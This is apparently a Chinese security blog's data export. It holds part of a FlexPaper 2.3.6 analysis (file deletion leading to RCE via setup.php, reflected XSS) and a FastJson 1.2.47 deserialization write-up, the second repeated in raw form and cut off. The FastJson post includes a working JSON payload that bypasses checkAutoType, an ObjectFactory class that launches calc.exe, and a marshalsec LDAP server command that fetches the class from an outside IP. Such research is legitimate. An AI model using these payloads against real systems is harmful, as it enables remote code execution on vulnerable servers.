CE漏洞以及两处未公开的xss漏洞</p>","more":"<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>我们首先通过diff2.3.6版本与2.3.7版本，查看下修改的文件</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJS9x.png\" alt=\"MTJS9x.png\"></p>\n<p>可见一共有7个php文件被修改。经过分析，除去mudraw_php5.php与view.php，其余5个都是安全更新。</p>\n<p>这些更新可以分为主要用来修复三个漏洞，具体见下文</p>\n<h3 id=\"任意文件删除导致的rce\"><a href=\"#任意文件删除导致的rce\" class=\"headerlink\" title=\"任意文件删除导致的rce\"></a>任意文件删除导致的rce</h3><p>php\\change_config.php存在如下更新</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJp36.png\" alt=\"MTJp36.png\"></p>\n<p>在change_config.php中，7-11行新增了一个权限校验模块，19-22行新增了一个setup.php文件存在性的判断</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJEEd.png\" alt=\"MTJEEd.png\"></p>\n<p>在46-47行间新增代码块中，由原来的删除$dir目录下所有文件，改为删除swf png以及jpg文件</p>\n<p>根据此处的更新可以推断出change_config.php中存在的漏洞可能有两处，其一是未授权的访问，在2.3.6版本中change_config.php文件首次管理员身份校验位于54行处，而不是文件开头，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJZ4I.png\" alt=\"MTJZ4I.png\"></p>\n<p>这也就意味着，在2.3.6版本change_config.php的前53行代码，皆可以无需身份验证而访问执行</p>\n<p>接下来分析下前53行，有没有可以利用的点</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJ0rF.png\" alt=\"MTJ0rF.png\"></p>\n<p>在如上图47行处，存在一处unlink方法，该处删除$dir指定目录中所有文件</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJ9gK.png\" alt=\"MTJ9gK.png\"></p>\n<p>$dir变量为系统中存放swf文件的路径，该值由$configManager-&gt;getConfig(‘path.swf’);得来，getConfig方法简单来说，就是从上图第一个红框里$configs变量里取出对应key对应的值，而$configs[‘path.swf’]又是由$path_pdf_workingdir变量传递而来</p>\n<p>接下来我们查看下$path_pdf_workingdir变量是否可控。仍然在change_config.php中</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJiuD.png\" alt=\"MTJiuD.png\"></p>\n<p>可见POST提交中存在SAVE_CONFIG参数时，即可通过POST提交SWF_Directory参数来赋值$path_pdf_workingdir变量，从而直接控制上文中需要使用unlink清空的$dir目录</p>\n<p>通过change_config.php提交的更新内容以及对2.3.6版本代码的分析可以得知，未授权用户可以使用change_config.php提供的功能，通过POST提交SWF_Directory参数来清空任意文件夹中的内容</p>\n<p>接着来分析change_config.php中第二处更新</p>\n<p>change_config.php中的第二处更新如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJkHH.png\" alt=\"MTJkHH.png\"></p>\n<p>加入了setup.php文件是否存在的判断的代码，当setup.php存在时则报出”Please delete<br>setup.php file in your flexpaper/php directory to access the FlexPaper<br>console.”并且exit。与之相类似的，在Index.php文件中也有类似的检查</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJFDe.png\" alt=\"MTJFDe.png\"></p>\n<p>“Set up has completed. Please delete the setup.php file in your flexpaper/php<br>directory to access the FlexPaper console. Refresh this page when done.”</p>\n<p>提醒用户安装结束后删除setup.php，但Index.php文件并没有强制exit程序</p>\n<p>这些线索全都指向了setup.php，setup.php其实是flexpaper后台的安装程序，主要用来生成以及配置配置文件</p>\n<p>从上文分析的未授权任意文件删除以及删除setup.php的提示来看，此次rce漏洞一定是由任意文件删除从而导致系统重装，在重装过程中setup.php安装程序存在一定的安全隐患导致了rce漏洞的产生</p>\n<p>接下来看下setup.php在此次漏洞中担当的角色</p>\n<p>在setup.php中首先发现了如下两个个方法pdf2jsonEnabled/pdf2swfEnabled</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTGLB4.png\" alt=\"MTGLB4.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJKv8.png\" alt=\"MTJKv8.png\"></p>\n<p>这两个方法调用exec将传入的变量直接执行，如上图红框处</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJBb4.png\" alt=\"MTJBb4.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJN80.png\" alt=\"MTJN80.png\"></p>\n<p>在setup.php中，程序多处调用这两个方法，如上图<br>而传入这两个方法中执行的$path_to_pdf2swf与$path_to_pdf2json变量竟然直接可以从GET请求中传入，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJmCt.png\" alt=\"MTJmCt.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJugf.png\" alt=\"MTJugf.png\"></p>\n<p>setup.php这个文件自身的访问并没有什么限制，只要setup.php文件存在，就可以被任意用户访问</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTGOHJ.png\" alt=\"MTGOHJ.png\"></p>\n<p>但是在setup.php中，存在如上图代码，会检测admin.password是否为null，来判断系统是否已经安装成功，安装过的系统将会直接触发exit，退出安装流程，也就无法执行后续我们任意代码执行的地方</p>\n<p>admin.password这个配置来自于php\\config\\config.ini.win.php</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJwKU.png\" alt=\"MTJwKU.png\"></p>\n<p>安装前如上图所示</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJavT.png\" alt=\"MTJavT.png\"></p>\n<p>安装后如上图所示</p>\n<p>配合任意文件删除把config目录清空，即可成功触发重装机制，执行setup.php并且通过GET请求中PDF2JSON_PATH或PDF2SWF_PATH参数传入payload，造成任意代码执行漏洞</p>\n<h3 id=\"simple-document-php中反射型XSS\"><a href=\"#simple-document-php中反射型XSS\" class=\"headerlink\" title=\"simple_document.php中反射型XSS\"></a>simple_document.php中反射型XSS</h3><p>php/simple_document.php 存在一处更新</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJU2V.png\" alt=\"MTJU2V.png\"></p>\n<p>可见，使用htmlspecialchars将GET请求传入的doc参数过滤</p>\n<p>接着看存在问题的版本</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJn8P.png\" alt=\"MTJn8P.png\"></p>\n<p>这里直接将GET请求中的doc参数echo，从而导致了xss漏洞的产生</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJrVJ.png\" alt=\"MTJrVJ.png\"></p>\n<h3 id=\"split-document-php中反射型XSS\"><a href=\"#split-document-php中反射型XSS\" class=\"headerlink\" title=\"split_document.php中反射型XSS\"></a>split_document.php中反射型XSS</h3><p>php/split_document.php中存在如下更新</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTGx41.png\" alt=\"MTGx41.png\"></p>\n<p>上图可见，更新后的程序使用htmlspecialchars将GET请求传入的doc参数过滤</p>\n<p>接着看存在问题的版本代码</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTGvNR.png\" alt=\"MTGvNR.png\"></p>\n<p>漏洞成因和上一节的如出一辙。但是这处都漏洞利用难度很大，原因如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJCjO.png\" alt=\"MTJCjO.png\"></p>\n<p>见上图红框处，存在一处getTotalPages方法，该方法接受我们传入payload的$doc参数作为pdf文件名，拼接pdf路径。</p>\n<p>跟入getTotalPages方法，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJy5R.png\" alt=\"MTJy5R.png\"></p>\n<p>在该方法中有如下判断：如果fopen或者fread传入的pdf文件失败，则返回false。这将导致我们js中numPages变量为空</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTGquF.png\" alt=\"MTGquF.png\"></p>\n<p>实际利用时，我们需要造一个payload，这个payload需要与pdf文件路径中的一个pdf文件的文件名相符，这点利用起来比较复杂。</p>\n<p>如果没有满足这个条件，则会出现如下错误: numPages = ;</p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTGjE9.png\" alt=\"MTGjE9.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/11/22/MTJVUA.png\" alt=\"MTJVUA.png\"></p>\n<p>Js脚本无法成功执行，xss不能稳定复现<br>因此此处的漏洞利用难度比较高</p>\n<h2 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h2><p>FlexPaper作为一个开源项目在互联网上非常流行。据相关资料显示，至少在2014年之前，维基解密一直在广泛的使用该组件。但是从本次漏洞来看，其安全性仍有待需提高。<br>关于本次漏洞的分析，在寻找存在漏洞的3.2.6版本花费了我一些时间：官网在github上的更新终止与2.2.7版；官网上没有关于旧版本的下载链接；FlexPaper3.2.7发行说明中丝毫没有提及安全相关的改动。花费了好久，最终才在一个下载站找到了3.2.6版本的源码。</p>"},{"title":"FastJson历史漏洞研究（二）","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ab6dc70c42e0a86ec0ad3c83f72100e.jpg","date":"2020-09-17T06:29:36.000Z","_content":"\n<img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.jpg\" width=\"0\" height=\"0\" />\n\n前言\n----\n\n本文衔接上一篇文章《FastJson历史漏洞研究（一）》，继续探讨一下FastJson的历史漏洞。这次将要介绍的是Fastjson 1.2.47版本存漏洞成因以及其利用方式。\n\nFastjson 1.2.47漏洞分析\n-----------------------\n\nFastjson 1.2.47版本漏洞与上篇文章中介绍的几处漏洞在原理上有着很大的不同。与Fastjson历史上存在的大多数漏洞不同的是，Fastjson 1.2.47版本的漏洞利用在AutoTypeSupport功能未开启时进行\n\n首先来看一下公开的poc\n\n```java\npublic class demo {\n    public static void main(String[] args) {\n        String payload = \"{\\\"a\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"},\" +\n                \"\\\"b\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/ExecTest\\\",\\\"autoCommit\\\":true}}\";\n        Object obj = JSON.parseObject(payload);\n        System.out.println(obj);\n    }\n}\n```\n\n\n\n从代码中可见，与以往利用不同的是，该poc中构造了两个json字符串\n\n1、\"a\":{\"\\@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}\n\n2、\"b\":{\"\\@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/ExecTest\",\"autoCommit\":true}\n\n为了弄清楚这样构造的意义，我们来动态调试一下这个漏洞\n\n程序首先解析第一个json字符串\n\n### \"a\":{\"\\@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"} 解析过程\n\n我们跳过部分FastJson解析流程，直接来看checkAutoType安全模块时的操作。对这个字符串中\\@type字段进行校验\n\n在位于com/alibaba/fastjson/parser/ParserConfig.java的checkAutoType安全模块中，程序首先进入了这个分支，程序调用getClassFromMapping对typeName进行解析，typeName即为字符串中@type的值，在第一个json字符串中，这个值为\"java.lang.Class\"\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2420aa3e444cd8831083d8d5b478abfc.png)\n\n我们跟入位于com/alibaba/fastjson/util/TypeUtils.java 的getClassFromMapping\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1645767771638713c708e6ea1cccd750.png)\n\n从上图代码可见，程序想从mappings中寻找键名为”java.lang.Class”的元素并返回对应的键值。值得一提的是，mappings集合与后文将要讲到的buckets集合对这个漏洞至关重要，这二者是这个漏洞产生的核心因素\n\n- mappings集合\n\nmappings中存储的数据都是什么呢?经过调试可以发现其中数据形式如下图中所展示\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1946d987b45c01b2fb8ef2f301f33555.png)\n\n从上图可见，mappings中存储着类名字符串以及对应类对象。然而mappings中的数据又是从何而来的呢？\n\n经过调试发现，mappings中存储的数据是由位于com/alibaba/fastjson/util/TypeUtils.java的addBaseClassMappings方法添加的\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1c543ae7df2885e45fcfb221acbaec02.png)\n\n从Mapping集合中的数据可以猜测，Mapping是用来存储一些基础的Class，以便于在反序列化处理这些基础类时提高效率\n\n在弄清楚mappings列表的由来后，继续回到正题。我们构造的typeName(@type指定的\"java.lang.Class\")并不在Mappings的键中。因此getClassFromMapping方法返回null，程序继续向下执行进入下一个if分支。此时程序接着调用deserializers.findClass对传入的typeName进行解析\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8dd7c917dd26e4b7b91f88e99b3f27b6.png)\n\n我们跟入位于com/alibaba/fastjson/util/IdentityHashMap.java的findClass方法进行进一步分析\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2f2986a32d56d2b54865f4ebcb9d23f6.png)\n\n从上图代码可见，程序会遍历buckets，取出其中元素的key属性值的名称并与传入的”java.lang.Class”进行比较，如果二者相同，则将这个Class对象返回\n\n- buckets集合\n\n现在我们要谈谈buckets集合了。buckets又存储着什么元素呢？见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/22563478e0b87b0d289cf35117c3231c.png)\n\n上图我们展开了一个buckets集合中元素进行展示。与Mapping集合相同的问题产生了：buckets中的元素都有哪些、他们又从何而来呢？经过调试我们在见下三张图中找到了答案\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8007c0112c7801da18f86ac3a75e8e6d.png)\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/412c0f522602bd8daf58abf8f69db50b.png)\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e6b05a79b6d0f0fdadd4cc6d77a4a18a.png)\n\n通过FastJson作者关于buckets集合的注释猜测，buckets是一个用于并发的IdentityHashMap\n\n回到调试流程中findClass方法来，我们构造的typeName(@type指定的\"java.lang.Class\")被findClass方法匹配到了，因此java.lang.Class类对象被返回\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/82dd20226b88a73b0da0445e9f14e06b.png)\n\n在findClass执行完成后，java.lang.Class类对象被返回到checkAutoType中并赋值给clazz，checkAutoType方法也将于963行处将clazz返回\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/46f06595b7368dd74198ee7d766d7b88.png)\n\n回顾一下上文中的Mapping集合和buckets集合，Fastjson为什么要将用户传入的\\@type字段指定的字符串在这两个集合中匹配呢?\n\nMapping集合则是用来存储基础的Class，如果\\@type字段传入的字符串如果对应了基础Class，程序则直接找到其类对象并将其类对象返回，从而跳过了checkAutoType后续的部分校验过程。而buckets集合则是用于并发操作。\n\n但无论Mapping集合与buckets集合实际作用是什么，但凡用户传入的\\@type字段字段值在两个集合中任意一个中，且程序使用JSON.parseObject(payload);这样的形式解析字符串(确保expectClass为空，防止进入上图957行if分支)，checkAutoType都将会直接将其对应的Class返回。\n\ncheckAutoType在将clazz返回后，程序将会执行到com/alibaba/fastjson/parser/DefaultJSONParser.java中的如下代码\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b533500e7b23d973fdbc5987b7dcbd46.png)\n\n从上图第一个红框可见，checkAutoType在将用户传入的@type值返回后，程序会赋值给上图316行处clazz变量，而上图384行处的deserialze方法紧接着处理这个clazz变量\n\n跟入位于com/alibaba/fastjson/serializer/MiscCodec.java的deserialze方法中\n\n```java\n    public <T> T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) {\n        JSONLexer lexer = parser.lexer;\n\n        ⋮\n\n            if (lexer.token() == JSONToken.LITERAL_STRING) {\n                if (!\"val\".equals(lexer.stringVal())) {\n                    throw new JSONException(\"syntax error\");\n                }\n                lexer.nextToken();\n            } else {\n                throw new JSONException(\"syntax error\");\n            }\n\n            parser.accept(JSONToken.COLON);\n\n            objVal = parser.parse();\n\n            parser.accept(JSONToken.RBRACE);\n\n        ⋮\n\n        if (objVal == null) {\n            strVal = null;\n        } else if (objVal instanceof String) {\n            strVal = (String) objVal;\n        } \n        \n        ⋮\n\n        if (clazz == Class.class) {\n            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());\n        }\n```\n\n此时传入deserialze中clazz变量为checkAutoType安全模块校验后返回的\"java.lang.Class\"，而fieldName变量值为解析的第一个json字段名\"a\"\n\n接着来看deserialze方法，在deserialze中与本次漏洞与poc构造的代码块主要有三部分，分别是：\n\n1. 取出json字符串中val值\n\n```java\n            if (lexer.token() == JSONToken.LITERAL_STRING) {\n                if (!\"val\".equals(lexer.stringVal())) {\n                    throw new JSONException(\"syntax error\");\n                }\n                lexer.nextToken();\n            } else {\n                throw new JSONException(\"syntax error\");\n            }\n\n            parser.accept(JSONToken.COLON);\n\n            objVal = parser.parse();\n\n            parser.accept(JSONToken.RBRACE);\n```\n\n在这段代码中，程序将判断传入的json字符串中是否有”val”,并将其值通过下图第一个红框处的代码取出赋值给objVal变量。\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/47177876b55bd9044eddca76e26b86de.png)\n\n2. 将objVal变量值转换为String类型并赋值strVal变量\n\n```java\n        if (objVal == null) {\n            strVal = null;\n        } else if (objVal instanceof String) {\n            strVal = (String) objVal;\n        } \n```\n\n这段代码与上一段衔接，objVal变量值又传递给下图第二个红框处。strVal变量判断objVal非空且为String类实例时，将其转换为String类型并赋值与strVal\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/886de67b224f656905c2ffb37cd22001.png)\n\n3. 调用TypeUtils.loadClass处理val值\n\n```java\n        if (clazz == Class.class) {\n            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());\n        }\n```\n\n这段代码的作用时，当传入的clazz变量为Class的类对象时，调用TypeUtils.loadClass处理strVal(即json字符串中的val值)\n\n在分析完deserialze方法的加工流程后，我们回头看看poc中构造的val值是什么，见下图红框处\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/088df0f5968737cfa586757403329393.png)\n\npoc中构造的是com.sun.rowset.JdbcRowSetImpl字符串，也就是过往漏洞利用中可利用的类。但是根据之前的分析，自从黑名单机制的完善，这个类早已已经不能简单的直接利用了，这个漏洞究竟是如何让这个类绕过黑名单重获新生呢？我们继续往下看看TypeUtils.loadClass中的操作，继续跟入位于com/alibaba/fastjson/util/TypeUtils.java的loadClass\n\n```java\n    public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {\n        if(className == null || className.length() == 0){\n            return null;\n        }\n        Class<?> clazz = mappings.get(className);\n        if(clazz != null){\n            return clazz;\n        }\n        if(className.charAt(0) == '['){\n            Class<?> componentType = loadClass(className.substring(1), classLoader);\n            return Array.newInstance(componentType, 0).getClass();\n        }\n        if(className.startsWith(\"L\") && className.endsWith(\";\")){\n            String newClassName = className.substring(1, className.length() - 1);\n            return loadClass(newClassName, classLoader);\n        }\n        try{\n            if(classLoader != null){\n                clazz = classLoader.loadClass(className);\n                if (cache) {\n                    mappings.put(className, clazz);\n                }\n                return clazz;\n            }\n        } catch(Throwable e){\n            e.printStackTrace();\n            // skip\n        }\n        try{\n            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();\n            if(contextClassLoader != null && contextClassLoader != classLoader){\n                clazz = contextClassLoader.loadClass(className);\n                if (cache) {\n                    mappings.put(className, clazz);\n                }\n                return clazz;\n            }\n        } catch(Throwable e){\n            // skip\n        }\n```\n\nloadClass接收的一个参数:\"className\"为String类型变量，根据上文的调用关系，这里传入的是字符串\"com.sun.rowset.JdbcRowSetImpl\",即className参数值为\"com.sun.rowset.JdbcRowSetImpl\"\n\n通过分析loadClass方法代码，可以发现如下代码\n\n```java\n        try{\n            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();\n            if(contextClassLoader != null && contextClassLoader != classLoader){\n                clazz = contextClassLoader.loadClass(className);\n                if (cache) {\n                    mappings.put(className, clazz);\n                }\n                return clazz;\n            }\n        }\n```\n\n在该代码段中，程序通过contextClassLoader.loadClass(className);方法从字符串类型className变量(\"com.sun.rowset.JdbcRowSetImpl\")获取到com.sun.rowset.JdbcRowSetImpl类对象，并赋值给clazz变量。此时的className、clazz变量形式如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f4935a82428a0c6642e7509665520283.png)\n\n接着，程序判断cache变量情况：在当cache为true时，将className、clazz键值对加入mappings集合(cache默认为true)。\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/841cfa794636ad9294c1c64afe0c1522.png)\n\n经过动态调试可以发现，通过上面的一系列操作，Mappings集合中确实已经加入了我们的恶意类com.sun.rowset.JdbcRowSetImpl，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/627c0a9c95e6249cd96f15fcfb201c8c.png)\n\n在我们的第一个json字符串解析完成后，程序随后会解析我们第二个json字符串\n\n### \"b\":{\"\\@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/ExecTest\",\"autoCommit\":true}解析过程\n\n与第一个json字符串解析流程完全一致，程序也执行到下图部分\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/24ef953b36ad28dd753484d28f2a5ffb.png)\n\n由于这次Mapping中有键名为com.sun.rowset.JdbcRowSetImpl的元素，因此clazz被赋值为com.sun.rowset.JdbcRowSetImpl类对象\n\n从下面两张图可见，此时上文的流程完全一致，只不过这次返回的时com.sun.rowset.JdbcRowSetImpl类对象\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a680629fb9e9f50beaff134655281076.png)\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5918f6f889685868b8888d34093a5b47.png)\n\ncom.sun.rowset.JdbcRowSetImpl恶意类被顺利返回，但是整个操作流程中并未触发checkAutoType黑白名单校验机制。随后com.sun.rowset.JdbcRowSetImpl恶意类被反序列化，触发漏洞利用\n\n## 漏洞利用\n\n为了证实漏洞的存在，我们首先在192.167.30.116服务器的80端口web服务上部署ExecTest.class。ExecTest.java中内容如下\n\n```java\nimport javax.naming.Context;\nimport javax.naming.Name;\nimport javax.naming.spi.ObjectFactory;\nimport java.io.IOException;\nimport java.util.Hashtable;\n\npublic class ExecTest implements ObjectFactory {\n\n    @Override\n    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {\n        exec(\"xterm\");\n        return null;\n    }\n\n    public static String exec(String cmd) {\n        try {\n            Runtime.getRuntime().exec(\"calc.exe\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return \"\";\n    }\n\n    public static void main(String[] args) {\n        exec(\"123\");\n    }\n}\n```\n\n使用marshalsec开启ladp服务，监听在1389端口\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://192.167.30.116/java/#ExecTest\" 1389\n```\n\n![image-20200918145806799](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145806799.png)\n\ndemo程序执行完毕，计算器成功弹出\n\n![image-20200918145737798](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145737798.png)","source":"_posts/fastjsonsecurity2.md","raw":"---\ntitle: FastJson历史漏洞研究（二）\ntags: web漏洞分析\ncategories: 技术\ntop_img: 'https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg'\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ab6dc70c42e0a86ec0ad3c83f72100e.jpg\ndate: 2020-09-17 14:29:36\n---\n\n<img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.jpg\" width=\"0\" height=\"0\" />\n\n前言\n----\n\n本文衔接上一篇文章《FastJson历史漏洞研究（一）》，继续探讨一下FastJson的历史漏洞。这次将要介绍的是Fastjson 1.2.47版本存漏洞成因以及其利用方式。\n\nFastjson 1.2.47漏洞分析\n-----------------------\n\nFastjson 1.2.47版本漏洞与上篇文章中介绍的几处漏洞在原理上有着很大的不同。与Fastjson历史上存在的大多数漏洞不同的是，Fastjson 1.2.47版本的漏洞利用在AutoTypeSupport功能未开启时进行\n\n首先来看一下公开的poc\n\n```java\npublic class demo {\n    public static void main(String[] args) {\n        String payload = \"{\\\"a\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"},\" +\n                \"\\\"b\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/ExecTest\\\",\\\"autoCommit\\\":true}}\";\n        Object obj = JSON.parseObject(payload);\n        System.out.println(obj);\n    }\n}\n```\n\n\n\n从代码中可见，与以往利用不同的是，该poc中构造了两个json字符串\n\n1、\"a\":{\"\\@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}\n\n2、\"b\":{\"\\@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/ExecTest\",\"autoCommit\":true}\n\n为了弄清楚这样构造的意义，我们来动态调试一下这个漏洞\n\n程序首先解析第一个json字符串\n\n### \"a\":{\"\\@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"} 解析过程\n\n我们跳过部分FastJson解析流程，直接来看checkAutoType安全模块时的操作。对这个字符串中\\@type字段进行校验\n\n在位于com/alibaba/fastjson/parser/ParserConfig.java的checkAutoType安全模块中，程序首先进入了这个分支，程序调用getClassFromMapping对typeName进行解析，typeName即为字符串中@type的值，在第一个json字符串中，这个值为\"java.lang.Class\"\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2420aa3e444cd8831083d8d5b478abfc.png)\n\n我们跟入位于com/alibaba/fastjson/util/TypeUtils.java 的getClassFromMapping\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1645767771638713c708e6ea1cccd750.png)\n\n从上图代码可见，程序想从mappings中寻找键名为”java.lang.Class”的元素并返回对应的键值。值得一提的是，mappings集合与后文将要讲到的buckets集合对这个漏洞至关重要，这二者是这个漏洞产生的核心因素\n\n- mappings集合\n\nmappings中存储的数据都是什么呢?经过调试可以发现其中数据形式如下图中所展示\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1946d987b45c01b2fb8ef2f301f33555.png)\n\n从上图可见，mappings中存储着类名字符串以及对应类对象。然而mappings中的数据又是从何而来的呢？\n\n经过调试发现，mappings中存储的数据是由位于com/alibaba/fastjson/util/TypeUtils.java的addBaseClassMappings方法添加的\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1c543ae7df2885e45fcfb221acbaec02.png)\n\n从Mapping集合中的数据可以猜测，Mapping是用来存储一些基础的Class，以便于在反序列化处理这些基础类时提高效率\n\n在弄清楚mappings列表的由来后，继续回到正题。我们构造的typeName(@type指定的\"java.lang.Class\")并不在Mappings的键中。因此getClassFromMapping方法返回null，程序继续向下执行进入下一个if分支。此时程序接着调用deserializers.findClass对传入的typeName进行解析\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8dd7c917dd26e4b7b91f88e99b3f27b6.png)\n\n我们跟入位于com/alibaba/fastjson/util/IdentityHashMap.java的findClass方法进行进一步分析\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2f2986a32d56d2b54865f4ebcb9d23f6.png)\n\n从上图代码可见，程序会遍历buckets，取出其中元素的key属性值的名称并与传入的”java.lang.Class”进行比较，如果二者相同，则将这个Class对象返回\n\n- buckets集合\n\n现在我们要谈谈buckets集合了。buckets又存储着什么元素呢？见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/22563478e0b87b0d289cf35117c3231c.png)\n\n上图我们展开了一个buckets集合中元素进行展示。与Mapping集合相同的问题产生了：buckets中的元素都有哪些、他们又从何而来呢？经过调试我们在见下三张图中找到了答案\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8007c0112c7801da18f86ac3a75e8e6d.png)\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/412c0f522602bd8daf58abf8f69db50b.png)\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e6b05a79b6d0f0fdadd4cc6d77a4a18a.png)\n\n通过FastJson作者关于buckets集合的注释猜测，buckets是一个用于并发的IdentityHashMap\n\n回到调试流程中findClass方法来，我们构造的typeName(@type指定的\"java.lang.Class\")被findClass方法匹配到了，因此java.lang.Class类对象被返回\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/82dd20226b88a73b0da0445e9f14e06b.png)\n\n在findClass执行完成后，java.lang.Class类对象被返回到checkAutoType中并赋值给clazz，checkAutoType方法也将于963行处将clazz返回\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/46f06595b7368dd74198ee7d766d7b88.png)\n\n回顾一下上文中的Mapping集合和buckets集合，Fastjson为什么要将用户传入的\\@type字段指定的字符串在这两个集合中匹配呢?\n\nMapping集合则是用来存储基础的Class，如果\\@type字段传入的字符串如果对应了基础Class，程序则直接找到其类对象并将其类对象返回，从而跳过了checkAutoType后续的部分校验过程。而buckets集合则是用于并发操作。\n\n但无论Mapping集合与buckets集合实际作用是什么，但凡用户传入的\\@type字段字段值在两个集合中任意一个中，且程序使用JSON.parseObject(payload);这样的形式解析字符串(确保expectClass为空，防止进入上图957行if分支)，checkAutoType都将会直接将其对应的Class返回。\n\ncheckAutoType在将clazz返回后，程序将会执行到com/alibaba/fastjson/parser/DefaultJSONPar